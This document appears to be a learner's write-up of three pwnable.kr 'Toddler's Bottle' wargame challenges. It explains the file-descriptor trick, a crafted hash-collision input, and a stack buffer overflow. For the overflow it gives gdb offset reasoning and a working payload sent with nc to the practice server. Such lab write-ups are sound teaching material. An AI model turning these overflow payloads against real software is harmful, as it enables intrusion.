Toddler's Bottle
================

Codes: https://gist.github.com/siddharthasahu/f46a965d7ce34a4b24cc

fd
--

A simple one.

* atoi(const char *str): Converts the char stream of digits to int 
* read(int fdes, void *buf, size_t nbyte): Reads `nbytes` bytes into `buf` variable from `fdes` file descriptor. [http://codewiki.wikidot.com/c:system-calls:read]
* Hex to decimal conversions in bash: http://stackoverflow.com/questions/13280131/hexadecimal-to-decimal-in-shell-script

Rest is simply setting the file descriptor to stdin and passing the matching string:  
`echo "LETMEWIN" | ./fd 4660`  
or even better: `echo "LETMEWIN" | ./fd $(printf "%d" 0x1234)`

Pwned!

collision
---------

This one led to a revision of signed vs unsigned integers, data ranges in C and interplay between binary, ASCII and hex.

* New bash commands: `od`, `xxd`, data conversion in `bc`
* Need to take care of byte ordering
* http://stackoverflow.com/questions/9487037/passing-binary-data-as-arguments-in-bash

The trick is to pass in 20 bytes which is picked in the form of 5 ints and added to get the result.

One of the possible answers: `$'\xE8\x05\xD9\x1D\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01'`

bof
---

Finally get to learn buffer overflows!

* Needs gdb debugging skills
* Function call conventions in x86: http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html

Objective is to replace the value of `key`. So basically one needs to calculate the position of the `key` variable in the stack and send an appropriate input so that it replaces `key` with desired data (0xcafebabe in this case).

GDB commands
$ gdb ./bof
(gdb) break func
(gdb) r
(gdb) disassemble

* From `lea    -0x2c(%ebp),%eax` in func+29, we come to know that the position of the `overflowme` variable in the stack, where our input starts getting stored is -0x2c = 44 bytes below the frame pointer (ebp).
* From function calling conventions, stack order is: function arguments -> eip (4 bytes) -> ebp (4 bytes) -> local variables. So position of `key` is 44 + 4 + 4 = 52 bytes from `overflowme` in the stack.
* From above and keeping in mind little endian systems, input can be: "a"*52+$'\xbe'$'\xba'$'\xfe'$'\xca'
* Trying: `echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"$'\xbe'$'\xba'$'\xfe'$'\xca' | nc pwnable.kr 9000`. Does not work.
* I did not solve this, but apparently the above format is closing the shell before commands can be sent.
* Repeat a character in bash: http://stackoverflow.com/questions/5349718/how-can-i-repeat-a-character-in-bash
* Final solution: `(echo $(printf "=%.0s" {1..52};printf "\xbe\xba\xfe\xca");cat) | nc pwnable.kr 9000`

TODO: Investigate why subshell with cat is needed here.

NOTE: If you try to insert a random big input, it gives a "stack smashing detected" error. Interesting to know, but not relevant to this problem, because the hack is in the function itself.
